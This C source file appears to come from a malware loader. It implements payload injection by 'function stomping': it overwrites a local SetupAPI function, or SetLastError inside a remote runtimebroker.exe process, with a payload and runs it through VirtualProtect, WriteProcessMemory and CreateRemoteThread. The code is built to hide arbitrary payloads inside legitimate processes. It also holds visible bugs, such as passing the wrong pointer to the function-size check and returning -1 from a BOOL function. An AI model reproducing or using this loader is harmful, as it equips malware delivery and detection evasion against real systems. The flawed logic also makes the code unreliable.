#include "loaders.h"
#include <setupapi.h>

#pragma comment (lib, "Setupapi.lib") // adding "setupapi.dll" to the import address table


BOOL WritePayloadViaLocalFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    *pAddress = &SetupScanFileQueueA;
	DWORD	dwOldProtection = 0;


	if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	_memcpy(*pAddress, pPayload, sPayloadSize);

	if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

size_t GetFunctionSize(PVOID function_start) {
    PBYTE retAddress = (PBYTE)findRetInstruction(function_start);
    if (!retAddress) {
        printf("Failed to find RET instruction within the search range\n");
        return 0;
    }
    return (size_t)(retAddress - (PBYTE)function_start + 1); // Include RET in size
}

BOOL WritePayloadViaRemoteFunctionStomping(OUT PVOID* pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	DWORD dwOldProtection = 0;
	SIZE_T sNumberOfBytesWritten = 0;

	DebugPrint("\n\n[i] Running with RemoteFunctionStomping ...\n\n");
	HANDLE hProcess = NULL;
	DWORD dwProcessId = 0;

	if (!GetRemoteProcessHandle(L"runtimebroker.exe", &dwProcessId, &hProcess)) {
		DebugPrint("[!] Failed to get remote process handle.\n");
		return FALSE;
	}
	DebugPrint("[i] Found Target Process Pid: %d \n", GetProcessId(hProcess));
	DebugPrint("[+] Address Of \"SetLastError\" In Remote Process: 0x%p \n", &SetLastError);

	if (!GetFunctionAddressInRemoteProcess(hProcess, "SetLastError", "kernel32.dll", pAddress)) {
		DebugPrint("[!] Failed To Get Address Of SetLastError In Remote Process. \n");
		CloseHandle(hProcess);
		return -1;
	}
	DebugPrint("[i] Resolved Function Address: 0x%p\n", *pAddress);

	if (GetFunctionSize(pAddress) < sPayloadSize) {
		DebugPrint("[!] Payload size is larger than the function size. \n");
		CloseHandle(hProcess);
		return FALSE;
	}

	// Change memory protection to allow writing
	if (!VirtualProtectEx(hProcess, *pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtectEx [RW] Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	// Write the payload to the specified address in the remote process
	if (!WriteProcessMemory(hProcess, *pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) ||
		sPayloadSize != sNumberOfBytesWritten) {
		DebugPrint("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		DebugPrint("[!] Bytes Written: %llu of %llu \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}

	// Change memory protection to allow execution
	if (!VirtualProtectEx(hProcess, *pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtectEx [RWX] Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	DebugPrint("[+] Payload successfully written and memory protections updated. \n");

	// Create a remote thread to execute the payload
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(*pAddress), NULL, 0, NULL);
	if (hThread == NULL) {
		DebugPrint("[!] CreateRemoteThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	// Wait for the thread to complete execution
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	return TRUE;
}
